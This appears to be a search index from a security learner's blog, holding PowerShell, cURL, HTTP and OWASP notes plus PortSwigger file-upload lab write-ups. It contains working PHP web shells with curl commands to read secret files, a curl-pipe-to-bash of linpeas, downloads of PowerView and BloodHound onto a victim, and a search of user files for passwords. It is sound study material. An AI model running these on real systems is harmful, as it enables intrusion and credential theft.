{"/about/":{"data":{"":"","core-competencies#Core Competencies":"Languages: Go, Python, C/C++ Infrastructure: Proxmox VE, Docker, Linux Hardening, AWS. Data \u0026 Vis: PostgreSQL, Elasticsearch (ELK), Grafana. Focus: Malware Development, Reverse Engineering, Threat Intelligence.","technical-philosophy#Technical Philosophy":"Code First: Theory is necessary, but implementation is proof. I prefer writing a tool to understand a vulnerability over reading a paper about it. Deep Dives: I do not settle for high-level abstractions. Whether it’s understanding the Windows API for malware development or dissecting network packets for CTI, I aim for the fundamental level.","the-operator#The Operator":"I am a Security Engineer and developer focused on Offensive Security and Infrastructure Automation.\nMy background is rooted in general computing and cybersecurity. Unlike the theoretical approach of academia, I learn by problem-oriented engineering: breaking complex concepts down into bite-sized coding tasks and building the tools I need to solve them."},"title":"Whoami"},"/archive/learning-powershell/":{"data":{"0b---learning-powershell#0b - Learning Powershell":"0b - Learning PowershellGetting available modules on the system\nGet-Module -ListAvailable Getting only loaded modules on the system\nGet-Module Loading Module on the system\nImport-Module PowershellGet Getting available functions provided by modules\nGet-Command -module \u003cModule_Name\u003e Output:\nPS C:\\Users\\George\u003e Get-command -module powershellget CommandType Name Version Source ----------- ---- ------- ------ Function Find-Command 2.2.5 powershellget Function Find-DscResource 2.2.5 powershellget Function Find-Module 2.2.5 powershellget Function Find-RoleCapability 2.2.5 powershellget Function Find-Script 2.2.5 powershellget Function Get-CredsFromCredentialProvider 2.2.5 powershellget Function Get-InstalledModule 2.2.5 powershellget Function Get-InstalledScript 2.2.5 powershellget Function Get-PSRepository 2.2.5 powershellget Function Install-Module 2.2.5 powershellget Function Install-Script 2.2.5 powershellget Function New-ScriptFileInfo 2.2.5 powershellget Function Publish-Module 2.2.5 powershellget Function Publish-Script 2.2.5 powershellget Function Register-PSRepository 2.2.5 powershellget Function Save-Module 2.2.5 powershellget Function Save-Script 2.2.5 powershellget Function Set-PSRepository 2.2.5 powershellget Function Test-ScriptFileInfo 2.2.5 powershellget Function Uninstall-Module 2.2.5 powershellget Function Uninstall-Script 2.2.5 powershellget Function Unregister-PSRepository 2.2.5 powershellget Function Update-Module 2.2.5 powershellget Function Update-ModuleManifest 2.2.5 powershellget Function Update-Script 2.2.5 powershellget Function Update-ScriptFileInfo 2.2.5 powershellget Finding and installing modules from [powershell gallery](PowerShell Gallery | Home)\nFind-Module -Name admintoolbox | Install-Module Installing module from local files\nDirectory: C:\\Users\\George\\Desktop\\PowerSploit Mode LastWriteTime Length Name ---- ------------- ------ ---- d---- 2/3/2025 10:42 AM AntivirusBypass d---- 2/3/2025 10:42 AM CodeExecution d---- 2/3/2025 10:42 AM docs d---- 2/3/2025 10:42 AM Exfiltration d---- 2/3/2025 10:42 AM Mayhem d---- 2/3/2025 10:42 AM Persistence d---- 2/3/2025 10:42 AM Privesc d---- 2/3/2025 10:42 AM Recon d---- 2/3/2025 10:42 AM ScriptModification d---- 2/3/2025 10:42 AM Tests -a--- 2/3/2025 10:42 AM 2852 .gitignore -a--- 2/3/2025 10:42 AM 1590 LICENSE -a--- 2/3/2025 10:42 AM 8652 mkdocs.yml -a--- 2/3/2025 10:42 AM 5452 PowerSploit.psd1 -a--- 2/3/2025 10:42 AM 150 PowerSploit.psm1 -a--- 2/3/2025 10:42 AM 15855 PowerSploit.pssproj -a--- 2/3/2025 10:42 AM 993 PowerSploit.sln -a--- 2/3/2025 10:42 AM 10491 README.md Install-Module .\\Powersploit.psd1 Getting help for commands with examples\nGet-Help \u003cPS-module\u003e -Examples Creating new Directory or File\nNew-Item -Name \"Folder\" -Type Directory New-Item -Name \"file.txt\" -Type File Adding contents to a file\nAdd-Content file.txt \"First line Second Line Third line\" Renaming folders/files at once\nGet-ChildItem -path *.txt | Rename-Item -NewName {$_.name -replace \".txt\", \".md\"} after the dot in $_. comes the property name like Name, Status etc.\nFiltering PowerShell object output. In this example I’m getting all local users, displaying their name, last login date, if password is required or not and sorting them alphabetically with their names\nGet-LocalUser * | Select-Object -Property Name,LastLogon,PasswordRequired,Enabled | Sort-Object Name all of the above is possible because PowerShell is made up of objects.\nGetting service based on string search\nGet-Service | where DisplayName -like \"*defend*\" | select-object -Property * like contains equal match not The results of above command show every service associated with Windows Defender and their properties.\nGetting count of unique items of whatever.\nGet-Process | sort | uniq | Measure-Object | select -Property Count | fl \u0026\u0026 Pipeline operator ensures that if current operation succeeds it then runs next command || Pipeline operator ensures that if current operation doesn’t run the next one will run | Pipeline operator runs whether or not previous command fails\nSearching for specific file in a directory\nGet-ChildItem -Path D:\\ -File -Recurse | where {$_.name -like \"*.txt\"} searching for sensitive strings in files\nGet-ChildItem -Path C:\\Users\\ -Filter \"*.txt\" -Recurse -File | sls \"Password\",\"credential\",\"key\" Get Properties and methods of an object\nGet-LocalUser administrator | get-member Getting structured contents of a website and what can be retrieved from the website\nInvoke-WebRequest -Uri \"https://www.hackthebox.com/\" -Method GET | Get-Member TypeName: Microsoft.PowerShell.Commands.BasicHtmlWebResponseObject Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals(System.Object obj) GetHashCode Method int GetHashCode() GetType Method type GetType() ToString Method string ToString() BaseResponse Property System.Net.Http.HttpResponseMessage BaseResponse {get;set;} Content Property string Content {get;} Encoding Property System.Text.Encoding Encoding {get;} Headers Property System.Collections.Generic.Dictionary[string,System.Collections.Generic.IEnumerable[strin… Images Property Microsoft.PowerShell.Commands.WebCmdletElementCollection Images {get;} InputFields Property Microsoft.PowerShell.Commands.WebCmdletElementCollection InputFields {get;} Links Property Microsoft.PowerShell.Commands.WebCmdletElementCollection Links {get;} RawContent Property string RawContent {get;set;} RawContentLength Property long RawContentLength {get;} RawContentStream Property System.IO.MemoryStream RawContentStream {get;set;} RelationLink Property System.Collections.Generic.Dictionary[string,string] RelationLink {get;} StatusCode Property int StatusCode {get;} StatusDescription Property string StatusDescription {get;} Filtering element details from website\nInvoke-WebRequest -Uri \"https://www.hackthebox.com/\" -Method GET | fl StatusCode Downloading a file\nInvoke-WebRequest -Uri \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1\" -OutFile \"C:\\PowerView.ps1\" If we already had PowerView.ps1 stored on our attack host we could use a simple python web server to host PowerView.ps1 and download it from the target.\nIn case Invoke-WebRequest method is restricted on victim machine\n(New-Object Net.WebClient).DownloadFile(\"https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip\", \"Bloodhound.zip\") Getting filtered AD users\nGet-ADUser -Filter 'Name -like \"*SvcAccount\"' | Format-Table Name,SamAccountName -A Get all users in a domain\nGet-ADUser -Filter * -SearchBase \"OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM\" Filter failed logon attempts using Get-EventLog\nGet-EventLog Security | where {$_.EventID -eq \"4625\"} | select -ExpandProperty Message | findstr \"Ac count Name\" | sort"},"title":"learning-powershell"},"/archive/notes/1-web-applications/":{"data":{"1---web-applications#1 - Web Applications":"","back-end-vulnerabilities#Back End Vulnerabilities":"1 - Web ApplicationsFront-End Vulnerabilities HTML Injection Type of injection where only front-end is affected. This includes web defacing too. I still don’t see the exploitability in this.\nXSS\nCross-site Scripting can be used like HTML Injection but besides DOM manipulation, you can also manipulate unsensitized user input and use Javascript to retrieve user data(whatever you can do with Javascript) We got - Reflected XSS - When result of XSS affects webapp after processing, as in search engines - Stored XSS - Kind of XSS which is retained in a db after reloading webpage - DOM XSS - using Javascript to steal front-end user data prolly\nCSRF Cross-site Request Forgery is used to perform API calls and queries, utilizing XSS or HTTP request and response parameters to attack. Also can upload remote code to escalate privileges or do similar stuff. like so: \"\u003e Although, modern browsers already have anti-CSRF features that prevent them from executing remote codes.\nPrevention Sanitization - Removing special characters and non-standard characters from user input before displaying it or storing it. Validation - Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format) Implement a Web Application Firewall or WAF Back End Vulnerabilities Broken Access Control / Broken Authentication Malicious file upload - when an attacker can upload malicious script or a file on the server that will not be validated and hence, executed on the server - potentially granting an attacker rce abilities. Command Injection - Allowing an attacker to inject commands in a filename and uploading, or download a faulty plugin that can be utilized to execute commands on it. SQL Injection or SQLi - executing misinterpreted SQL queries on a database and retrieving sensitive data from it. SSRF Access Control Path Traversal","common-vulnerability-scoring-system-cvss#Common Vulnerability Scoring System (CVSS)":"It is an industry standard scoring system for system vulnerability scoring. CVSS uses Base, Temporal, Environmental metrics.\nThe most critical vulnerabilities for back-end components are found in web servers, as they are publicly accessible over the TCP protocol. External Web Application vulnerabilities may be exploited to gain access to back-end components.","front-end-vulnerabilities#Front-End Vulnerabilities":"","prevention#Prevention":"","public-vulnerabilities#Public Vulnerabilities":"CWE - Common Weakness Enumeration (mitre.org) NVD - Home (nist.gov) Vulnerability \u0026 Exploit Database - Rapid7 VULNERABILITY LAB - SECURITY VULNERABILITY RESEARCH LABORATORY - Best Independent Bug Bounty Programs, Responsible Disclosure \u0026 Vulnerability Coordination Platform - INDEX (vulnerability-lab.com) Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers (exploit-db.com) These are just a few examples of Common Vulnerability and Exposure(CVE) databases.\nExploits are usually interesting from score 8-10 or that lead to RCE."},"title":"_index"},"/archive/notes/1-web-applications/1a-web-requests/":{"data":{"1a---web-requests#1a - Web Requests":"1a - Web RequestsIn this module, I learned that HTTP is an application-level protocol used to exchange information between information systems.\nThis protocol works in a request-response mode.\nIt has 8 request types:\nGET - Requests a specific resource from the server HEAD - Requests only general data POST - Requests to process the sent information and return the corresponding response PUT - Requests to upload the sent information DELETE - Requests to delete existing information from the server CONNECT - This term is reserved for future versions of HTTP TRACE - Requests feedback from the server regarding the status of the information OPTIONS - Requests information about the connection to the server The response has status codes that reflect information about the satisfaction of the request. It provides a short text description using a 3-digit status code. The status code is used by the computer and the text description is used by a human.\nStatus codes:\n1xx - Informational 100 Continue 101 Switching Protocols 2xx - Successful 200 OK 201 Created 202 Accepted 203 Non-Authoritative Information 204 No Content 205 Reset Content 206 Partial Content 3xx - Redirect 300 Multiple Choices 301 Moved Permanently 302 Found 303 See Other 304 Not Modified 305 Use Proxy 306 Unused 307 Temporary Redirect 4xx - Client Error 400 Bad Request 401 Unauthorized 402 Payment Required 403 Forbidden 404 Not Found 405 Method Not Allowed 406 Not Acceptable 407 Proxy Authentication Required 408 Request Timeout 409 Conflict 410 Gone 411 Length Required 412 Precondition Failed 413 Request Entity Too Large 414 Request-URI Too Long 415 Unsupported Media Type 416 Requested Range Not Satisfiable 417 Expectation Failed 5xx - Server Error 500 Internal Server Error 501 Not Implemented 502 Bad Gateway 503 Service Unavailable 504 Gateway Timeout 505 HTTP Version Not Supported"},"title":"_index"},"/archive/notes/1-web-applications/1a-web-requests/1a1-http-requests/":{"data":{"1a1---http-requests#1a1 - HTTP requests":"1a1 - HTTP requestsHTTP headers are used to transfer information from the client or server. The client function can be implemented by the cURL program, which is a good tool for pentesting. We have the following categories of headers\nGeneral Headers Entity Headers Request Headers Response Headers Security Headers General Headers are used to describe the message, not its content. They are found in HTTP requests and responses.\nHeader Example Description Date Date: Wed, 16 Feb 2022 10:38:44 GMT Message creation date Connection Connection: Keep-Alive Determines whether the connection should remain open or be closed with the following tags: close or Keep-Alive Entity Headers are used to describe the content of a message and are found in POST and PUT headers.\nHeader Example Description Content-Type Content-Type: text/html Describes the type of resource being transferred. Media-Type Media-Type: application/pdf Similar to the content type, but directly conveys the type of information. Boundary boundary=“b4e4fbd93540” Used to separate multiple pieces of data in a single message. Content-Length Content-Length: 385 Contains the size of the information to be transmitted. Content-Encoding Content-Encoding: gzip It transmits a way of encoding information. Request Headers are used for HTTP requests and has no connection to the content of the information. It has the following headers\nHeader Example Description Host Host: www.inlanefreight.com Describes the address of the server to which the request is sent. User-Agent User-Agent: curl/7.77.0 It is used to describe the client agent. This header can be used to determine what program the client is using to connect to the server. Referer Referer: http://www.inlanefreight.com/ Describes where the current demand is coming from. Accept Accept: */* Describes what types of information the client can accept. */* means all types of data are allowed. Cookie Cookie: PHPSESSID=b4e4fbd93540 A cookie record consists of a name=value pair. It is data that is stored on the client and server and serves as an identifier. It is sent to the server on each request to identify the client. It can also be used for session tracking. Multiple cookies can be contained in one header and are separated by a ; . Authorization Authorization: BASIC cGFzc3dvcmQK One way to identify a client. After authentication, the server assigns the client a unique token, which is stored on the client side and will be retrieved by the server on each request. Response Headers are used in the HTTP response header and is also unrelated to context. Age, location, and server data are used in the response header to create context.\nHeader Example Description Server Server: Apache/2.2.14 (Win32) Contains information about the server Set-Cookie Set-Cookie: PHPSESSID=b4e4fbd93540 Contains a cookie record about the user. WWW-Authenticate WWW-Authenticate: BASIC realm=“localhost” Informs the client about the possible authentication type Security Headers are used to set rules and policies for the browser.\nHeader Example Content-Security-Policy Content-Security-Policy: script-src ‘self’ Strict-Transport-Security Strict-Transport-Security: max-age=31536000 Referrer-Policy Referrer-Policy: origin"},"title":"1a1-http-requests"},"/archive/notes/1-web-applications/1a-web-requests/1a2-curl/":{"data":{"":"1a2 - cURLcURL (Client URL) is a CLI program used to establish communication with various protocols and retrieve information. It is a good tool for pentesting because it provides raw data from a web application.\nUsage: curl [options...] -d, --data HTTP POST data -f, --fail Fail fast with no output on HTTP errors -h, --help Get help for commands -i, --include Include response headers in output -o, --output Write to file instead of stdout -O, --remote-name Write output to file named as remote file -s, --silent Silent mode -T, --upload-file Transfer local FILE to destination -u, --user Server user and password -A, --user-agent Send User-Agent to server -v, --verbose Make the operation more talkative -V, --version Show version number and quit -d is used to insert information into the URL -H is used to specify HTTP Headers -X is used to specify the request type (GET, POST, PUT, DELETE...) - POST create/upload - PUT replace - DELETE delete - GET read -v print verbose -i print response header -I show header only -u authentication arguments `curl -u admin:admin http://example.com/auth.php` Replacing information in the database using the CRUD API on the website\ncurl -X PUT 94.237.53.157:42065/api.php/city/Tbilisi -d '{\"city_name\":\"flag\", \"country_name\":\"(HTB)\"}' -H 'Content-Type: application/json'","1a2---curl#1a2 - cURL":"","attacking-a-login-form-with-curl#Attacking a Login Form with cURL":"$ curl --data \"email=test@test.com\u0026password=test\" http://10.10.10.10/login.php","automate-user-creation-and-test-for-mysql_real_escape_string-bypass#Automate user creation and test for mysql_real_escape_string bypass":"The following is a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. Here is a bash script I created for a CTF to validate a theory I had about its use of the PHP mysql_real_escape_string method:\n#!/bin/bash # Test for mysql_real_escape_string email=test@test.com password=1234567890123456789012345678901234567890123456789012345678901234567890123456789 fuzz=\"뽜’’AA\" name=\"‘¿’’AA\" ip=\"10.10.10.10\" echo \"Creating User: ${email}\" curl -i -b 'cookies.txt' -c 'cookies.txt' -d \"name=${name}\u0026email=${email}\u0026password=${password}\u0026type=Admin\" \"http://${ip}/index.php\" 2\u003e/dev/null echo \" \" echo \"============================================\" echo \"Login as User\" echo \"============================================\" curl -i -c 'cookies.txt' -d \"email=${email}\u0026password=${password}\u0026type=Admin\" \"http://${ip}/index.php\" 2\u003e/dev/null | grep 'location' echo \" \" echo \"============================================\" echo \"Check user profile with cookie\" echo \"============================================\" curl -b 'cookies.txt' \"http://${ip}/index.php\" -v 2\u003e/dev/null | grep 'td align=\"center\"' echo \" \" echo \"============================================\" echo \"Change Name\" echo \"============================================\" curl -b 'cookies.txt' -d \"name=${fuzz}\u0026type=Admin\" \"http://${1}/index.php\" echo \" \" curl -b 'cookies.txt' \"http://${ip}/profile.php\" 2\u003e/dev/null | grep 'td align=\"center\"' echo \" \" echo \" DELETEING COOKIE \" rm cookies.txt echo \"============================================\" echo \"Relogin as User - did password change?\" echo \"============================================\" curl -i -c 'cookies.txt' -d \"email=${email}\u0026password=${password}\u0026type=Admin\" \"http://${ip}/index.php\" 2\u003e/dev/null | grep 'location' echo \" \" echo \" DONE!\" echo \" DELETEING COOKIE \" rm cookies.txt","check-to-see-if-a-user-login-is-correct-in-a-bash-script#Check to see if a user login is correct in a Bash script":"The following script can be used to verify that a username and login is correct. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. It will check the response length characters to see if it is a valid response. You will need to adjust the expected character count for your application.\n#!/bin/bash result=($(curl --data \"email=$2\u0026password=$3\" \"$1\" 2\u003e/dev/null | wc -c)) echo $result if [ \"$result\" == '0' ] then echo 'zero' else echo 'NOT zero' fi Here is the script in action:\n$ ./check_user.sh http://10.10.10.10/login.php test@test.com testpassword 0 NOT zero","creating-new-users-with-curl#Creating new users with cURL":"$ curl --data \"name=test\u0026email=test@test.com\u0026password=test\" http://10.10.10.10/newuser.php","curl-cookies#cURL COOKIES":"cURL has an entire cookie engine that can be used to store and load cookies passed to it from a server between sessions:\n$ curl -b oldcookies.txt -c newcookies.txt http://10.10.10.10/login.php You can also specify your own cookies using the -b parameter:\n$ curl -b \"PHPSESSID=vn0g4d94rs09rgpqga85r9bnia\" http://10.10.10.10/home.php","curl-download-a-file-to-the-current-folder#cURL download a file to the current folder":"$ curl -O http://10.10.10.10/payload.zip","curl-follow-http11-302-found-redirects#cURL follow HTTP/1.1 302 Found redirects":"curl -L http://10.10.10.10/profile.php","curl-get-parameters#cURL GET parameters":"HTTP GET variables can be set by adding them to the URL.\n$ curl http://10.10.10.10/index.php?sessionid=vn0g4d94rs09rgpqga85r9bnia","curl-output-response-headers-to-stdout#cURL Output Response Headers to STDOUT":"$ curl -i http://10.10.10.10/profile.php","curl-post-parameters#cURL POST parameters":"HTTP POST variables can be set using the -d (–data) parameter.\nHere is a simple login test example:\n$ curl --data \"email=test@test.com\u0026password=test\" http://10.10.10.10/login.php","curl-save-the-server-response-to-a-file#cURL Save the server response to a file":"$ curl -o payload.sh http://10.10.10.10/payload.sh","curl-user-agents#cURL User Agents":"$ curl -A \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\" http://10.10.10.10/login.php","curl-view-verbose-debugging-information-response-headers-and-other-debug-details---std2#cURL view verbose debugging information (response headers and other debug details - STD2)":"$ curl -v http://10.10.10.10/profile.php","fuzzing-post-parameter-length-limits-with-curl#Fuzzing POST parameter length limits with cURL":"The following script can be used to fuzz a webserver POST parameters and write the output to a file and track changes to that output. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash.\nHere is the bash shell script:\n#!/bin/bash echo \"args: \" echo \"Length Lines Words Bytes Filename\" echo \"---------------------------------\" for ((i = $2; x \u003c= $3; i++)) do fuzz=\"\" for ((x = 1; x \u003c= $i; x++)) do fuzz+=\"A\" done #echo \"COUNT: $i $fuzz\" #echo \"${5}${fuzz}\" echo \"${i}\" | { tr -d '\\n' ; curl \"${1}\" -o ${4} -d \"${5}${fuzz}\" 2\u003e/dev/null | wc ${4}; } done Here is an example of what it looks like running:\n./fuzz_post.sh http://10.10.10.10/ 1000 1000000 output.txt \"user=test\u0026password=test\" args: Length Lines Words Bytes Filename --------------------------------- 1000 9 31 274 output.txt ... ... 100000 11 37 343 output.txt 100001 11 37 343 output.txt","fuzzing-web-servers-with-curl#Fuzzing Web Servers with cURL":"Often we performing an assessment against a webserver, we will attempt to trigger error conditions which will provide some deeper insights into the underlying processes and software. cURL can be a powerful fuzzing tool for generating these edge case error messages.","fuzzing-with-uri-length--get-parameter-length-limits-with-curl#Fuzzing with URI length / GET parameter length limits with cURL":"The following script can be used to fuzz a webserver with a long URL track the changes in output and write the output to a file. It is meant to be a basic scaffold for you to build a fit for purpose fuzzer using cURL and Bash. You can modify the url to either fuzz a URI or a GET parameter.\nHere is the bash shell script:\n#!/bin/bash echo \"args: \" echo \"Length Lines Words Bytes Filename\" echo \"---------------------------------\" for ((i = $2; x \u003c= $3; i++)) do fuzz=\"\" for ((x = 1; x \u003c= $i; x++)) do fuzz+=\"A\" done #echo \"COUNT: $i $fuzz\" #echo \"${1}${fuzz}\" echo \"${i}\" | { tr -d '\\n' ; curl \"${1}${fuzz}\" -o ${4} 2\u003e/dev/null | wc ${4}; } done Here is an example of what it looks like running:\n./fuzz_url.sh http://10.10.10.10/ 1000 1000000 output.txt args: Length Lines Words Bytes Filename --------------------------------- 1000 9 31 274 output.txt ... ... 100000 11 37 343 output.txt 100001 11 37 343 output.txt 100002 11 37 343 output.txt 100003 11 37 343 output.txt 100004 11 37 343 output.txt 100005 11 37 343 output.txt","hacking-with-curl#Hacking with cURL":"Now that we have covered the basic syntax and use cases, here are some practical hacking applications that are very helpful on Hackthebox or CTF boxes.","using-curl-to-pipe-a-remote-scipt-linpeassh-directly-to-bash#Using cURL to pipe a remote scipt (linpeas.sh) directly to bash:":"$ curl -sSk \"http://10.10.10.10/linpeas.sh\" | bash"},"title":"1a2-curl"},"/archive/notes/1-web-applications/1b-owasp-top-10-2021/":{"data":{"1-broken-access-control#1. Broken Access Control":"An application has multiple access points from the outside. The goal of Access Control is to allow authorized users to access it and block unauthorized users. BAC means that an unauthorized user will gain access to the data of an authorized user. For example, by using an API.","10-server-side-request-forgery#10. Server Side Request Forgery":"SSRF occurs when web application fetches remote resource without validating user-supplied request/url. fetching an url is common feature nowadays.\nduring SSRF an attacker FORGES a request that can retrieve unauthorized data from the server back to an attacker.","1b---owasp-top-10-2021#1b - OWASP TOP 10 2021":"1b - OWASP TOP 10 2021","2-cryptographic-failures#2. Cryptographic Failures":"Weak encryption of sensitive information or no encryption at all. Certificate management Downgrade attacks Automatic encryption (good) \u0026 automatic decryption (bad)","3-injection#3. Injection":"LDAP SQL XSS Incorrect Sanitization","4-insecure-design#4. Insecure Design":"Related to application design and architectural flaws. Anything that can be exploited by an attacker to cause damage is Insecure Design.","5-security-misconfiguration#5. Security Misconfiguration":"Non-latest features Delayed Updates Non-removed testing application on the server(have a known vulnerability, open ports) error message(non-handled exceptions, detalis) TLS","6-vulnerable-and-outdated-components#6. Vulnerable and Outdated Components":"know vulnerabilities external components external libraries frameworks","7-identification-and-authentication-failures#7. Identification and Authentication Failures":"User auth and identification problems Session timeout","8-software-and-data-integrity-failures#8. Software and Data Integrity Failures":"basically it means making software changes without checking CI/CD integrity and authenticity.\nupdates are not verified before updating - attacker can change software monitoring software source was infiltrated and then pushed this compromised software to endpoints.","9-security-logging-and-monitoring-failures#9. Security Logging and Monitoring Failures":"insufficient logging and monitoring leaving out important asset monitoring and logging alerts for suspicious activities log file storage should not be only locally(backup) alert threshold"},"title":"1b-owasp-top-10-2021"},"/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/":{"data":{"1f---file-upload-vulnerabilities#1f - File Upload Vulnerabilities":"1f - File Upload VulnerabilitiesFUV is when a web server allows to upload files to its filesystem without proper validation - like their name, type, contents or size. Failing to fulfil these could cause an attacker to upload arbitrary and potentially dangerous file instead of image for example - this includes server-side script files that enable RCE.\nIn some cases, the act of uploading the file in itself can cause damage, in others - it may involve payload over HTTP\nGiven fairly clear dangers of FUV, developers commonly implement protection mechanisms, however developers also commonly implement what is believed to have robust validation mechanisms that is easily flawed or can be easily bypassed.\nBlacklisting dangerous file types is not enough - it may not work in case filename is obfuscated checking file attributes is not enough - file attributes can be easily manipulated From a security perspective the worst case would be if a website allows server-side script uploads such as Python, PHP, Ruby and is configured to run them as code. In this case it is easy to deploy a Web Shell.\nWeb Shell is a script that allows an attacker to execute arbitrary commands on a remote server by simply sending HTTP requests to the right endpoint.\nAn ability to upload a web shell, effectively leads to full control over the server.\nfollowing PHP one-liner could be used to read files from the server’s filesystem:\n\u003c?php echo file_get_contents('/path/to/target/file'); ?\u003e\nOnce uploaded, sending a request for this malicious PHP script will return file’s contents in the response.\nA more versatile web shell version:\n\u003c?php echo system($_GET['command']); ?\u003e\nThis script allows to pass an arbitrary system command through query parameters as follows:\nGET /example/exploit.php?command=id HTTP/1.1"},"title":"_index"},"/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f1-remote-code-execution-via-web-shell-upload-portswigger-lab/":{"data":{"":"1f1 - Remote code execution via web shell upload [PortSwigger Lab]This lab contains a vulnerable image upload function. It doesn’t perform any validation on the files users upload before storing them on the server’s filesystem.\nTo solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.\nYou can log in to your own account using the following credentials: wiener:peter","1f1---remote-code-execution-via-web-shell-upload-portswigger-lab#1f1 - Remote code execution via web shell upload [PortSwigger Lab]":"","solution#\u003cstrong\u003eSolution:\u003c/strong\u003e":"So this application has an unprotected upload field in user page where you can upload profile avatar.\nFrom there, I effectively uploaded a file named mal.php with contents \u003c?php echo system($_GET['command']); ?\u003e\nonce upload was done, I had to know where the file was uploaded so I could call it. Inspecting avatar link gave me the clue. so I opened up terminal and called the mal.php\n$\u003e curl -X GET \"https://0a9000000490ee47800ead51001f0062.web-security-academy.net/files/avatars/mal.php?command=pwd\" /var/www/html/avatars /var/www/html/avatars Now I know I’m at /var/www/html/avatars. So to read the contents of the secrets file, all I have to do is a simple [[2 - Portswigger Academy#Path Traversal |Path Traversal]]\n$\u003e curl -X GET \"https://0a9000000490ee47800ead51001f0062.web-security-academy.net/files/avatars/mal.php?command=cat%20../../../../home/carlos/secret\" U4AE****************************U4AE**************************** Keep in mind this method repeats the message twice, so I had to remove the second part of message.\nThe secret contents:`U4AE****************************'\nMost of the times, FOV will not be this easy. There will be defense mechanisms in place, but it doesn’t mean they are robust. They can still be exploited by finding flaws in these defense mechanisms.\nFlawed file type validation When submitting HTML forms, the browser sends this data in POST request with content type application/x-www-form-url-encoded. This is fine for textual data, but for larger amounts of binary data like PDF or images, content type multipard/form-data is preferred. Consider the following example of form upload with image field, description and username\nPOST /images HTTP/1.1 Host: normal-website.com Content-Length: 12345 Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 Content-Disposition: form-data; name=\"image\"; filename=\"example.jpg\" Content-Type: image/jpeg [...binary content of example.jpg...] ---------------------------012345678901234567890123456 Content-Disposition: form-data; name=\"description\" This is an interesting description of my image. ---------------------------012345678901234567890123456 Content-Disposition: form-data; name=\"username\" wiener ---------------------------012345678901234567890123456-- We can see Content-Type, filename, binary data and other interesting information about this form in here.\nOne way that a website might validate uploaded file, is to check the input-specific Content-Type if it matches expected file type. if it only expects image/png it will only allow PNG. It could become problematic if the server trusts this header for what a file is and doesn’t perform further validation on the file, whether the file itself matches its description. this defense can be bypassed a tool like BurpSuite."},"title":"1f1-remote-code-execution-via-web-shell-upload-portswigger-lab"},"/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f2-web-shell-upload-via-content-type-restriction-bypass-portswigger-lab/":{"data":{"":"This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.\nTo solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.\nYou can log in to your own account using the following credentials: wiener:peter","solution#Solution:":"So upon logging in my account, I can see the avatar upload field.\nTesting this functionality by uploading an empty test.txt file gives me an error\nSorry, file type text/plain is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.\nThe next thing I tried was to upload the same file but modify the HTTP request using burpsuite and change Content-Type: Text/Plain to Content-Type: image/jpeg. This bypassed a defense mechanism and as a result it let me upload a text file\nNow it’s time to upload a web shell mal.php with the following contents:\n\u003c?php echo system($_GET['command']); ?\u003e\nNow, since I know that this mal.php is uploaded in /files/avatars/mal.php, I can call it using CURL.\nAnd we got the secret\ncurl -X GET \"https://0a2200b703596e51800635e70004004c.web-security-academy.net/files/avatars/mal.php?command=cat%20../../../../home/carlos/secret\" 7nJBS****************************7nJBS**************************** remember that calls form curl like this repeats the response twice, so I had to remove the double of this output.\nThe secret contents: 7nJB****************************\nImpact of FUVs generally depend on two key factors:\nWhich aspect of the file the website fails to validate properly, whether its the size, type, contents… what restrictions are imposed once file is uploaded In the worst case scenario, the file is not validated at all and the server configuration allows certain types to run as code - potentially giving an attacker web shell and full access to a webserver.\nIn case filename isn’t validated properly, an attacker might just replace original file with a malicious one.\nFailing to validate file size might also enable an attacker to perform a DoS.\nHow Web servers handle static file requests?\nGenerally, static files on a website can be mapped 1:1 with a filesystem hierarchy.\nNowadays modern applications are dynamic and hence complex. Path of a request may not necessarily represent a filesystem entirely. Nowadays, web servers still deal with static requests for some static files like stylesheets, images etc.\nThe process for handling such files is historically largely the same. - The server parses the path in the request to identify the file extension. Then uses this information to determine the filetype by comparing it to preconfigured mapping between extensions and MIME types.\nif the file is non-executable like HTML file, it may just send the file in the HTTP response if the file is executable like PHP or PYTHON and the server is configured to execute these files, it will assign variables based on the headers and parameters in the HTTP request before executing it. The result may be passed on to HTTP response after. if the file is executable, but the server is not configured to run them, it will generally respond with an error or in some cases, just send back the plain text representation of the code to the client. such misconfigurations may lead to code and sensitive data leakage. The Content-Type response header may provide clues as to what kind of file the server thinks it has served. As a precaution, servers generally only run scripts whose filetypes have been explicitly defined to execute. Otherwise they may return an error message or plaintext of source code. In such cases, it might only be possible to leak the source but won’t be able to deploy a webshell.\nThis kind of configuration will have a strict policy for directories where user can upload files than other locations on the filesystem that are assumed to be out of reach from users. If you can find a directory where user-uploaded files are not supposed to be, the code might execute.\nWeb servers often use the filename field in multipart/form-data requests to determine the name and location where the file should be saved."},"title":"1f2 - Web shell upload via Content-Type restriction bypass \\[Portswigger Lab]"},"/archive/notes/1-web-applications/1f-file-upload-vulnerabilities/1f3-web-shell-upload-via-path-traversal-portswigger-lab/":{"data":{"":"This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.\nTo solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret.\nYou can log in to your own account using the following credentials: wiener:peter","solution#Solution:":"So, User’s page includes avatar upload function. just to upload mal.php with contents \u003c?php echo system($_GET['command']); ?\u003e will just return plaintext version of this script.\nit also seems that uploading mal.php with path traversal ../mal.php still 